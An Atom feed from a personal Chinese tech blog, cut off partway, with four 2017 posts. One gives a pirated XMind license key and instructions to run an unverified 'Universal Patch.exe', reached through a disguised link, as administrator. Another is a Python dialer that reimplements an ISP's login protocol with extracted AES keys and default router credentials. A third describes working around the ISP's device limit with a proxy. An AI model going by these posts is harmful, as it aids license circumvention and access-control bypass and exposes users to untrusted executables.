<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  <subtitle>Python &amp; Hacker</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://hacktech.cn/"/>
  <updated>2017-12-22T09:09:14.351Z</updated>
  <id>http://hacktech.cn/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XMind8 Pro版激活序列码与补丁</title>
    <link href="http://hacktech.cn/2017/12/22/Xmind-Patch-Crack.html"/>
    <id>http://hacktech.cn/2017/12/22/Xmind-Patch-Crack.html</id>
    <published>2017-12-22T08:50:23.000Z</published>
    <updated>2017-12-22T09:09:14.351Z</updated>
    
    <content type="html"><![CDATA[<p>//通用许可证密钥//</p>
<p>XMind Pro 2013~XMind Pro 8：<br><a id="more"></a><br><a href="gnrsu@appnee.com">电子邮件地址</a><br><a href="XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345">许可证密钥</a></p>
<p>//安装说明//</p>
<p>对于XMind 8/8 Update 1/2/3/4/5/6：</p>
<ol>
<li>从官方网站下载并安装XMind 8</li>
<li>现在不要启动它</li>
<li>将“Universal Patch.exe”复制到程序目录，并以管理员身份运行</li>
<li>启动XMind 8，输入“ 帮助/许可证… /输入许可证 ”</li>
<li>使用上面的许可证密钥进行注册</li>
<li>OK</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fmpnqbummcj20ep0a5aam.jpg" alt=""></p>
<p>聪明的会知道:<a href="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xdTVLR3pkbldqMWNzbGtwNkxoYmFhV1JiUDZXQTlqTVEvdmlldz91c3A9c2hhcmluZw==">Universal Patch.exe</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;//通用许可证密钥//&lt;/p&gt;
&lt;p&gt;XMind Pro 2013~XMind Pro 8：&lt;br&gt;
    
    </summary>
    
      <category term="life" scheme="http://hacktech.cn/categories/life/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>湖北掌大协议拨号Python脚本</title>
    <link href="http://hacktech.cn/2017/12/15/Hubei-Exin-portal-Python-Script.html"/>
    <id>http://hacktech.cn/2017/12/15/Hubei-Exin-portal-Python-Script.html</id>
    <published>2017-12-15T10:04:58.000Z</published>
    <updated>2017-12-15T10:33:13.039Z</updated>
    
    <content type="html"><![CDATA[<p>湖北定制版协议拨号<br>本来之前我e信账号被加小黑屋就没弄了，没想到又被放出小黑屋了，可以上了<br>据说1月份换协议，且用且珍惜，另外感谢<a href="https://github.com/miao1007/Openwrt-NetKeeper" target="_blank" rel="external">陈大的项目</a></p>
<a id="more"></a>
<p>使用的第三方库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">requests</div><div class="line">BeautifulSoup4</div><div class="line">wxPython</div></pre></td></tr></table></figure></p>
<p>支持老毛子固件（登录账号密码均为admin），如果不是老毛子请手动填写路由器wan口获取的ip<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> wx</div><div class="line"><span class="keyword">import</span> wx.xrc</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">###########################################################################</span></div><div class="line"><span class="comment">## Class MyFrame1</span></div><div class="line"><span class="comment">###########################################################################</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">HubeiPortal</span>:</span></div><div class="line">    AES_KEY_PASSWORD = <span class="string">"pass012345678910"</span></div><div class="line">    AES_KEY_SESSION = <span class="string">"jyangzi5@163.com"</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password, localIpAddress, useragent)</span>:</span></div><div class="line">        self.UserName = username</div><div class="line">        self.Password = password</div><div class="line">        self.Headers = &#123;</div><div class="line">            <span class="string">'Charset'</span>: <span class="string">'UTF-8'</span>, </div><div class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>, </div><div class="line">            <span class="string">'App'</span>: <span class="string">'HBZD'</span>, </div><div class="line">            <span class="string">'User-Agent'</span>: useragent,</div><div class="line">            <span class="comment">#'User-Agent': 'Mozilla/Android/6.0.1/SM-G9250/ffffffff-f56d-7f76-ffff-ffffd097bd08',</span></div><div class="line">        &#125;</div><div class="line">        self.Host = <span class="string">'58.53.196.165:8080'</span></div><div class="line">        self.LocalIpAddress = localIpAddress</div><div class="line">        self.AccessToken = <span class="string">''</span></div><div class="line">        self.Cookie = &#123;&#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSecret</span><span class="params">(self)</span>:</span></div><div class="line">        url = <span class="string">'http://'</span> + self.Host + <span class="string">'/wf.do?clientType=android&amp;code=1&amp;version=6.0.1&amp;clientip='</span> + self.LocalIpAddress</div><div class="line">        <span class="comment"># url=http://58.53.196.165:8080/wf.do?device=Phone%3ALetv+X620%5CSDK%3A23&amp;clientType=android&amp;code=1&amp;version=6.0&amp;clientip=100.64.64.76</span></div><div class="line">        hRequest = requests.get(url, headers=self.Headers, timeout=<span class="number">10</span>)</div><div class="line">        self.AccessToken = self.parseToHtml(hRequest)</div><div class="line">        self.Cookie[<span class="string">'JSESSIONID'</span>] = hRequest.cookies[<span class="string">'JSESSIONID'</span>]</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">authenticate</span><span class="params">(self)</span>:</span></div><div class="line">        url = <span class="string">'http://'</span> + self.Host + <span class="string">'/wf.do'</span></div><div class="line">        postData = &#123;</div><div class="line">            <span class="string">'password'</span>: self.getPasswordEnc(self.Password), </div><div class="line">            <span class="string">'clientType'</span>: <span class="string">'android'</span>, </div><div class="line">            <span class="string">'username'</span>: self.UserName, </div><div class="line">            <span class="string">'key'</span>: self.getSessionEnc(self.AccessToken), </div><div class="line">            <span class="string">'code'</span>: <span class="number">8</span>,</div><div class="line">            <span class="string">'clientip'</span>: self.LocalIpAddress, </div><div class="line">        &#125;</div><div class="line">        hRequest = requests.post(url, data=postData, cookies=self.Cookie, headers=self.Headers)</div><div class="line">        resp = self.parseToHtml(hRequest)</div><div class="line">        <span class="keyword">return</span> resp</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getPasswordEnc</span><span class="params">(self, sPasswd)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.toHex(self.aesEcbEnc(sPasswd, self.AES_KEY_PASSWORD))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSessionEnc</span><span class="params">(self, sSession)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.toHex(self.aesEcbEnc(sSession, self.AES_KEY_SESSION))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aesEcbEnc</span><span class="params">(self, sText, aes_key)</span>:</span></div><div class="line">        aes_key = bytes(aes_key, encoding=<span class="string">'utf-8'</span>)</div><div class="line">        sText = bytes(sText, encoding=<span class="string">'utf-8'</span>)</div><div class="line">        cipher = AES.new(aes_key, AES.MODE_ECB)</div><div class="line">        <span class="keyword">if</span> len(sText) &lt;= <span class="number">16</span>:</div><div class="line">            <span class="keyword">while</span> len(sText) % <span class="number">16</span> != <span class="number">0</span>:</div><div class="line">                sText += <span class="string">b'\n'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">while</span> len(sText) % <span class="number">48</span> != <span class="number">0</span>:</div><div class="line">                sText += <span class="string">b'\x10'</span></div><div class="line">        cipher_text = cipher.encrypt(sText)</div><div class="line">        <span class="keyword">return</span> cipher_text</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">toHex</span><span class="params">(self, sEncrypt)</span>:</span></div><div class="line">        <span class="keyword">return</span> binascii.b2a_hex(sEncrypt).decode(<span class="string">'utf-8'</span>).upper()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseToHtml</span><span class="params">(self, hRequest)</span>:</span></div><div class="line">        <span class="keyword">return</span> hRequest.text</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Connect</span><span class="params">(self)</span>:</span></div><div class="line">        self.getSecret()</div><div class="line">        <span class="keyword">return</span> self.authenticate()</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame1</span> <span class="params">( wx.Frame )</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">( self, parent )</span>:</span></div><div class="line">        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = <span class="string">u"snk"</span>, pos = wx.DefaultPosition, size = wx.Size( <span class="number">246</span>,<span class="number">246</span> ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )</div><div class="line">        </div><div class="line">        self.SetSizeHints( wx.DefaultSize, wx.DefaultSize )</div><div class="line">        </div><div class="line">        fgSizer2 = wx.FlexGridSizer( <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span> )</div><div class="line">        fgSizer2.SetFlexibleDirection( wx.BOTH )</div><div class="line">        fgSizer2.SetNonFlexibleGrowMode( wx.FLEX_GROWMODE_SPECIFIED )</div><div class="line">        </div><div class="line">        self.m_staticText2 = wx.StaticText( self, wx.ID_ANY, <span class="string">u"账号"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        self.m_staticText2.Wrap( <span class="number">-1</span> )</div><div class="line">        fgSizer2.Add( self.m_staticText2, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_textCtrl4 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        fgSizer2.Add( self.m_textCtrl4, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_staticText3 = wx.StaticText( self, wx.ID_ANY, <span class="string">u"密码"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        self.m_staticText3.Wrap( <span class="number">-1</span> )</div><div class="line">        fgSizer2.Add( self.m_staticText3, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_textCtrl5 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_PASSWORD )</div><div class="line">        fgSizer2.Add( self.m_textCtrl5, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_staticText4 = wx.StaticText( self, wx.ID_ANY, <span class="string">u"UA"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        self.m_staticText4.Wrap( <span class="number">-1</span> )</div><div class="line">        fgSizer2.Add( self.m_staticText4, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_textCtrl6 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        fgSizer2.Add( self.m_textCtrl6, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_staticText5 = wx.StaticText( self, wx.ID_ANY, <span class="string">u"内网IP"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        self.m_staticText5.Wrap( <span class="number">-1</span> )</div><div class="line">        fgSizer2.Add( self.m_staticText5, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_textCtrl7 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        fgSizer2.Add( self.m_textCtrl7, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_checkBox1 = wx.CheckBox( self, wx.ID_ANY, <span class="string">u"记住信息"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        fgSizer2.Add( self.m_checkBox1, <span class="number">0</span>, wx.ALL|wx.EXPAND, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        self.m_button1 = wx.Button( self, wx.ID_ANY, <span class="string">u"点击更新IP(需2s)"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        fgSizer2.Add( self.m_button1, <span class="number">0</span>, wx.ALL|wx.EXPAND, <span class="number">5</span> )</div><div class="line"></div><div class="line">        self.m_button2 = wx.Button( self, wx.ID_ANY, <span class="string">u"开始连接"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</div><div class="line">        fgSizer2.Add( self.m_button2, <span class="number">0</span>, wx.ALL|wx.EXPAND, <span class="number">5</span> )</div><div class="line">        </div><div class="line">        </div><div class="line">        self.SetSizer( fgSizer2 )</div><div class="line">        self.Layout()</div><div class="line">        </div><div class="line">        self.Centre( wx.BOTH )</div><div class="line">        </div><div class="line">        <span class="comment"># Connect Events</span></div><div class="line">        r_internet = requests.get(<span class="string">'http://192.168.1.1/status_wanlink.asp'</span>, headers=&#123;<span class="string">'Authorization'</span>:<span class="string">'Basic YWRtaW46YWRtaW4='</span>&#125;)</div><div class="line">        ip4_wan = re.search(<span class="string">r"function\ wanlink\_ip4\_wan\(\)\ \&#123; return\ \'(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\'\;\&#125;"</span>, r_internet.text).group(<span class="number">1</span>)</div><div class="line">        self.m_textCtrl7.SetValue(ip4_wan)</div><div class="line"></div><div class="line">        <span class="comment"># get info from config file</span></div><div class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">"SnkGui.ini"</span>):</div><div class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"SnkGui.ini"</span>,<span class="string">'r'</span>):</div><div class="line">                config = line.split(<span class="string">' : '</span>)</div><div class="line">                <span class="keyword">if</span> config[<span class="number">0</span>] == <span class="string">'username'</span>:</div><div class="line">                    self.m_textCtrl4.SetValue(config[<span class="number">1</span>].strip())</div><div class="line">                <span class="keyword">if</span> config[<span class="number">0</span>] == <span class="string">'password'</span>:</div><div class="line">                    self.m_textCtrl5.SetValue(config[<span class="number">1</span>].strip())</div><div class="line">                <span class="keyword">if</span> config[<span class="number">0</span>] == <span class="string">'useragent'</span>:</div><div class="line">                    self.m_textCtrl6.SetValue(config[<span class="number">1</span>].strip())</div><div class="line">        self.m_checkBox1.Bind( wx.EVT_CHECKBOX, self.SaveConfig )</div><div class="line">        self.m_button1.Bind( wx.EVT_BUTTON, self.getWANIP4 )</div><div class="line">        self.m_button2.Bind( wx.EVT_BUTTON, self.Connect )</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">( self )</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    </div><div class="line">    </div><div class="line">    <span class="comment"># Virtual event handlers, overide them in your derived class</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">SaveConfig</span><span class="params">( self, event )</span>:</span></div><div class="line">        <span class="keyword">with</span> open(<span class="string">"SnkGui.ini"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</div><div class="line">            config = []</div><div class="line">            config.append(<span class="string">'username : '</span>+self.m_textCtrl4.GetValue() + <span class="string">'\n'</span>)</div><div class="line">            config.append(<span class="string">'password : '</span>+self.m_textCtrl5.GetValue() + <span class="string">'\n'</span>)</div><div class="line">            config.append(<span class="string">'useragent : '</span>+self.m_textCtrl6.GetValue() + <span class="string">'\n'</span>)</div><div class="line">            f.writelines(config)</div><div class="line">    </div><div class="line">    <span class="comment"># get ip4_wan from 192.168.1.1(老毛子路由器)</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getWANIP4</span><span class="params">( self, event )</span>:</span></div><div class="line">        headers = &#123;</div><div class="line">			<span class="comment"># 其中YWRtaW46YWRtaW4=是admin:admin（路由器账号密码）的base64编码，可以自己根据格式进行编码修改</span></div><div class="line">            <span class="string">'Authorization'</span> : <span class="string">'Basic YWRtaW46YWRtaW4='</span>,</div><div class="line">        &#125;</div><div class="line">        payload = &#123;</div><div class="line">            <span class="string">'wan_action'</span> : <span class="string">'Connect'</span>, </div><div class="line">            <span class="string">'modem_prio'</span> : <span class="string">'1'</span>,</div><div class="line">        &#125;</div><div class="line">        r_reconnect = requests.post(<span class="string">'http://192.168.1.1/device-map/wan_action.asp'</span>, headers=headers, data=payload)</div><div class="line">        time.sleep(<span class="number">2</span>)</div><div class="line">        r_internet = requests.get(<span class="string">'http://192.168.1.1/status_wanlink.asp'</span>, headers=headers)</div><div class="line">        ip4_wan = re.search(<span class="string">r"function\ wanlink\_ip4\_wan\(\)\ \&#123; return\ \'(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\'\;\&#125;"</span>, r_internet.text).group(<span class="number">1</span>)</div><div class="line">        self.m_textCtrl7.SetValue(ip4_wan)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Connect</span><span class="params">( self, event )</span>:</span></div><div class="line">        username = self.m_textCtrl4.GetValue()</div><div class="line">        password = self.m_textCtrl5.GetValue()</div><div class="line">        localIpAddress = self.m_textCtrl7.GetValue()</div><div class="line">        useragent = self.m_textCtrl6.GetValue()</div><div class="line">        eXin = HubeiPortal(username,password,localIpAddress,useragent)</div><div class="line">        ConnInfo = eXin.Connect()</div><div class="line">        <span class="keyword">if</span> <span class="string">"auth00"</span> <span class="keyword">in</span> ConnInfo:</div><div class="line">            wx.MessageBox(<span class="string">u"连接成功"</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            wx.MessageBox(ConnInfo)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    app = wx.App(<span class="keyword">False</span>) </div><div class="line">    frame = MyFrame1(<span class="keyword">None</span>) </div><div class="line">    frame.Show(<span class="keyword">True</span>) </div><div class="line">    <span class="comment">#start the applications </span></div><div class="line">    app.MainLoop() </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<p>供测试UA<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Mozilla/Android/6.0.1/SM-G925f/ffffffff-f78d-7f76-ffff-ffffd097bd08</div></pre></td></tr></table></figure></p>
<p>其中SM-G925f(格式不限)与ffffffff-f78d-7f76-ffff-ffffd097bd08(格式需相同)均可修改</p>
<p>如果不是老毛子，ip获取不到，直接手动填写ip即可</p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fmhmk6pu9zj206u06uq34.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;湖北定制版协议拨号&lt;br&gt;本来之前我e信账号被加小黑屋就没弄了，没想到又被放出小黑屋了，可以上了&lt;br&gt;据说1月份换协议，且用且珍惜，另外感谢&lt;a href=&quot;https://github.com/miao1007/Openwrt-NetKeeper&quot;&gt;陈大的项目&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="life" scheme="http://hacktech.cn/categories/life/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>e信与酸酸结合开wifi使用路由器上网</title>
    <link href="http://hacktech.cn/2017/11/12/exin-ssserver.html"/>
    <id>http://hacktech.cn/2017/11/12/exin-ssserver.html</id>
    <published>2017-11-12T03:21:43.000Z</published>
    <updated>2017-11-12T05:23:31.054Z</updated>
    
    <content type="html"><![CDATA[<p>关于e信“正常情况下”使用路由器网上是有方法的，入户线插上lan，电脑接lan拨号<br>我想要说的是连接e信后使用路由器上网，并且是绝对正常的思维<br><a id="more"></a><br>手机也是可以连接上wifi，但是手机上连接wifi后的ip地址不是我们的路由器分配和路由器网关，我们改掉，使手机与电脑处于同一网关<br>然后电脑开ssserver（这玩意是什么不用我多说，其实你也可以电脑搭建http proxy server（比如使用cow），然后手机连接wifi设置直接通过代理，但是对于纯tcp和udp就无能为力了）<br>手机连接电脑ssserver，可以上网了，通过开debug模式可以发现走的是电脑ssserver上网<br>具体的小白详细教程做法看心情和时间吧</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于e信“正常情况下”使用路由器网上是有方法的，入户线插上lan，电脑接lan拨号&lt;br&gt;我想要说的是连接e信后使用路由器上网，并且是绝对正常的思维&lt;br&gt;
    
    </summary>
    
      <category term="life" scheme="http://hacktech.cn/categories/life/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>golang解析json配置文件</title>
    <link href="http://hacktech.cn/2017/10/25/golang%E8%A7%A3%E6%9E%90json%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.html"/>
    <id>http://hacktech.cn/2017/10/25/golang解析json配置文件.html</id>
    <published>2017-10-25T05:22:55.000Z</published>
    <updated>2017-11-03T09:52:22.449Z</updated>
    
    <content type="html"><![CDATA[<p>突然想起来自己以前写的，golang写的一个简易的json解析器，分享一下</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">go</span> get github.com/akkuman/parseConfig</div></pre></td></tr></table></figure>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><a id="more"></a>
<h3 id="环境假设"><a href="#环境假设" class="headerlink" title="环境假设"></a>环境假设</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── config.go</div><div class="line">├── config.json</div></pre></td></tr></table></figure>
<p>config.json内容  </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"name"</span> : <span class="string">"akkuman"</span>,</div><div class="line">    <span class="attr">"urls"</span> : [<span class="string">"xx.com"</span>,<span class="string">"ww.com"</span>],</div><div class="line">    <span class="attr">"info"</span> : &#123;</div><div class="line">        <span class="attr">"qq"</span> : <span class="string">"123456"</span>,</div><div class="line">        <span class="attr">"weixin"</span>: <span class="string">"123456"</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该库取出来的都是类型为interface{}的数据，如需取出具体类型的数据需要自己加断言</p>
<p>当取嵌套map数据的时候，以“ &gt; ”指定下一级，注意&gt;两边均有空格，具体见下面的例子</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>config.go内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">package main</div><div class="line"></div><div class="line">import (</div><div class="line">    &quot;github.com/akkuman/parseConfig&quot;</div><div class="line">)</div><div class="line"></div><div class="line">func main() &#123;</div><div class="line">    var config = parseConfig.New(&quot;config.json&quot;)</div><div class="line">    // 此为interface&#123;&#125;格式数据</div><div class="line">    var name = config.Get(&quot;name&quot;)</div><div class="line">    // 断言</div><div class="line">    var nameString = name.(string)</div><div class="line">    </div><div class="line">    // 取数组</div><div class="line">    var urls = config.Get(&quot;urls&quot;).([]interface&#123;&#125;)</div><div class="line">    var urlsString []string</div><div class="line">    for _,v := range urls &#123;</div><div class="line">        urlsString = append(urlsString, v.(string))</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 取嵌套map内数据</div><div class="line">    var qq = config.Get(&quot;info &gt; qq&quot;).(&quot;string&quot;)</div><div class="line">    var weixin = config.Get(&quot;info &gt; weixin&quot;).(&quot;string&quot;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;突然想起来自己以前写的，golang写的一个简易的json解析器，分享一下&lt;/p&gt;
